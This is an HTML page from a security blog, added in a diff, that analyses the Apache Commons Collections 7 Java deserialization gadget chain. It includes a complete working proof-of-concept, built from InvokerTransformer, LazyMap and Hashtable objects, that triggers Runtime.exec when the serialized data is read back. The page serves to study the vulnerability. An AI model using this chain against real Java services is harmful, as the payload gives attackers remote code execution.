@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Apache-Commons-Collections 7 - ConsT27's Blog</title>
+    <link href="../../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Apache-Commons-Collections 7", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "\u7248\u672c", url: "#_2" },
+              {title: "\u5229\u7528\u94fe", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E4%B8%80%E4%BA%9Btrick/%E4%B8%80%E4%BA%9Btrick/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E4%B8%80%E4%BA%9Btrick/%E4%B8%80%E4%BA%9Btrick/" class="btn btn-xs btn-link">
+        一些trick
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Apache-Commons-Collections%206/Apache-Commons-Collections%206/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Apache-Commons-Collections%206/Apache-Commons-Collections%206/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 6
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="apache-commons-collections-7">Apache-Commons-Collections 7</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#版本">版本</a></li>
+<li><a href="#利用链">利用链</a><ul>
+<li><a href="#POC分析1">POC分析1</a></li>
+<li><a href="#POC分析2">POC分析2</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="_2">版本</h2>
+<p>CommonsCollections 3.1 - 3.2.1</p>
+<h2 id="_3">利用链</h2>
+<pre><code class="language-java">HashTable.readObject()
+  HashTable.reconstitutionPut()
+    AbstractMapDecorator.equals()
+       AbstractMap.equals()
+         LazyMap.get()
+            ChainedTransformer.transform()
+            ConstantTransformer.transform()
+            InvokerTransformer.transform()
+                Method.invoke()
+                    Class.getMethod()
+            InvokerTransformer.transform()
+                Method.invoke()
+                    Runtime.getRuntime()
+            InvokerTransformer.transform()
+                Method.invoke()
+                    Runtime.exec()
+
+</code></pre>
+<p>POC</p>
+<pre><code class="language-java">import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.*;
+
+public class Main {
+
+    public static void main(String[] args) throws Exception {
+        ChainedTransformer transformerChain = new ChainedTransformer(new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {
+                        String.class, Class[].class }, new Object[] {
+                        &quot;getRuntime&quot;, new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] {
+                        Object.class, Object[].class }, new Object[] {
+                        null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;,
+                        new Class[] { String.class }, new Object[]{&quot;calc&quot;})});
+
+        Map innerMap1 = new HashMap();
+        Map innerMap2 = new HashMap();
+
+        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
+        lazyMap1.put(&quot;yy&quot;, 1);
+
+        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
+        lazyMap2.put(&quot;zZ&quot;, 1);
+
+        Hashtable hashtable = new Hashtable();
+        hashtable.put(lazyMap1, 1);
+        hashtable.put(lazyMap2, 2);
+
+        lazyMap2.remove(&quot;yy&quot;);
+
+        try{
+            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;./cc7&quot;));
+            outputStream.writeObject(hashtable);
+            outputStream.close();
+
+            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;./cc7&quot;));
+            inputStream.readObject();
+        }catch(Exception e){
+            e.printStackTrace();
+        }
+
+    }
+}
+</code></pre>
+<p>在Hashtable#readObject中存在如下代码块</p>
+<p><img alt="" src="../image/image_u0WE8f7zD0.png" /></p>
+<p>存在方法reconstitutionPut，进行跟进</p>
+<p><img alt="" src="../image/image_X_SN3AqUaD.png" /></p>
+<p>这里会将两个LazyMap用AbstractMapDecorator#equals 进行比较。这里的两个key值就分别代表着两个LazyMap。</p>
+<p><img alt="" src="../image/image_FaLmd1tcOT.png" /></p>
+<p>跟进后发现又有一个equals方法，跟进来到AbstractMap#equals</p>
+<p><img alt="" src="../image/image_ojMVWVUPuZ.png" /></p>
+<p>发现会对传入的TiedMapEntry调用get方法</p>
+<p><img alt="" src="../image/image_o6x3q5lp30.png" /></p>
+<p>这样看，链就明了了。</p>
+<h3 id="poc1">POC分析1</h3>
+<pre><code class="language-java">        Map innerMap1 = new HashMap();
+        Map innerMap2 = new HashMap();
+
+        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
+        lazyMap1.put(&quot;yy&quot;, 1);
+
+        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
+        lazyMap2.put(&quot;zZ&quot;, 1);
+</code></pre>
+<p>我们发现此处put的值是yy和zZ，我们如果put其他值的话是不能完成这条链的。我们看这个地方。</p>
+<p><img alt="" src="../image/image_J5U6Uy1Uoj.png" /></p>
+<p>hash方法在这里会获取key值（在这里就是LazyMap对象）的key值的hash。
+所以这里会判断hashtable中的两个key值（也就是两个LazyMap对象）的key值hash是否相同，只有相同才能下一步。
+而yy和zZ的hash值在java中是相同的</p>
+<p><img alt="" src="../image/image_jKekE6fOQC.png" /></p>
+<p>这个时候可能会有疑问，为什么LazyMap的key值不能设成一样的呢？因为设成一样的会造成如下问题</p>
+<p><img alt="" src="../image/image_jo_Buw6RcO.png" /></p>
+<p>在readObject时会造成elements元素的值为1</p>
+<p><img alt="" src="../image/image_A2kF171T-T.png" /></p>
+<p>elements值为1，则在此处只能进行一次循环，导致Hashtable#equals方法不能被执行（Hashtable#equals方法需要至少两个hashtable中的key值才能执行，具体逻辑见上文）。</p>
+<h3 id="poc2">POC分析2</h3>
+<pre><code class="language-java">        Hashtable hashtable = new Hashtable();
+        hashtable.put(lazyMap1, 1);
+        hashtable.put(lazyMap2, 2);
+
+        lazyMap2.remove(&quot;yy&quot;);
+</code></pre>
+<p>我们在序列化前对hashtable进行第二次put操作时，也会调用equals方法</p>
+<p><img alt="" src="../image/image_8THtiMDzGb.png" /></p>
+<p>从而会触发lazymap2的get方法，我们这里会发现调用了put方法向lazymap2增加了键值对。</p>
+<p><img alt="" src="../image/image_7-i5EZ5EH3.png" /></p>
+<p>进而导致lazymap2的结构变成了这样</p>
+<p><img alt="" src="../image/image_7ZJ9WrboMr.png" /></p>
+<p>可以发现在value处存在一个ProcessImpl对象，这个对象没有实现序列化接口，不能被序列化，所以如果没有lazymap2.remove("yy")，就会导致在序列化时出现错误。</p>
+<p><img alt="" src="../image/image_xUJFrCQbLK.png" /></p>
+<p>所以通过lazymap2.remove("yy")，可以帮助我们剔除在hashtable#put时添加进lazymap2中的不可序列化的对象，实现序列化。</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E4%B8%80%E4%BA%9Btrick/%E4%B8%80%E4%BA%9Btrick/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E4%B8%80%E4%BA%9Btrick/%E4%B8%80%E4%BA%9Btrick/" class="btn btn-xs btn-link">
+        一些trick
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Apache-Commons-Collections%206/Apache-Commons-Collections%206/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Apache-Commons-Collections%206/Apache-Commons-Collections%206/" class="btn btn-xs btn-link">
+        Apache-Commons-Collections 6
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
